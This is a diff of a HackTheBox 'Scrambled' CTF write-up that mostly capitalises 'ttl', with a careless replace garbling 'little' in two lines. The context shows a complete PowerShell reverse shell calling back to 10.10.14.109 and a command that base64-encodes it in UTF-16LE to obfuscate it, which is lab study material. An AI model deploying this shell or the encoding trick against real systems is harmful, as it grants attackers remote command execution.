@@ -21,7 +21,7 @@ RID bruteforcing is NTLM authenication only!
 
 ## Recon
 
-The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
+The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
 ![ping](HackTheBox/Retired-Machines/Scrambled/Screenshots/ping.png)
 
 [Jazzpizazz](https://github.com/jazzpizazz/BloodHound.py-Kerberos) needs more love!
@@ -219,7 +219,7 @@ Alh4zr3d's obfuscate reverse shell is just this with the variables changed
 $client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',88);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-He then base64, lttle endians it: convert it to UTF-16LE, which the Windows Default encoding, encodes it to base64 then removes the newline .
+He then base64, lTTLe endians it: convert it to UTF-16LE, which the Windows Default encoding, encodes it to base64 then removes the newline .
 ```bash
 iconv -f ASCII -t UTF-16LE $reverseshell.txt | base64 | tr -d "\n"
 ```
@@ -303,7 +303,7 @@ When make New Order it creates a serialized order and sending with UPLOAD_ORDER 
 
 #### Website
 
-[Build a Static Website on IIS](https://learn.microsoft.com/en-us/iis/manage/creating-websites/scenario-build-a-static-website-on-iis) had a little point around and read.
+[Build a Static Website on IIS](https://learn.microsoft.com/en-us/iis/manage/creating-websites/scenario-build-a-static-website-on-iis) had a liTTLe point around and read.
 
 #### JuicyPotatoNG TIL
 
